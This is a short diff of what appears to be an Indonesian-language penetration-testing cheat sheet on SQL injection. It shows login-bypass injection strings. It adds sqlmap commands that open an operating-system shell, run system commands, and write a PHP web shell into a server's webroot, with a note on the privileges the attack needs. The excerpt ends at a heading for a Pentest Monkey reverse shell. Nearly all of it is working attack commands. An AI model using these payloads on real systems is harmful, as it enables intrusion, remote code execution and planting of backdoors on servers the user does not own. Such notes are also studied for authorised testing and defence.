@@ -74,12 +74,13 @@ MySQL ✗ driver PHP (mysqli/PDO) menolak
 
 admin'-- -
 ' OR '1'='1'-- -
+sqlmap -u "http://target/page.php?id=1" --os-shell
+sqlmap -u "http://target/?id=1" --os-cmd="id"
 
+sqlmap -u "http://target/?id=1" --file-write="/local/path/shell.php" --file-dest="/var/www/html/shell.php"
 sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\MYUSER-FU\Downloads\shell.php" --file-dest="/var/www/html/shell.php"
 
-
-
-
+Syarat: FILE privilege & path webroot absolut diketahui (mis. /var/www/html).
 ```
 
 Reverse Shell dari Pentest Monkey 
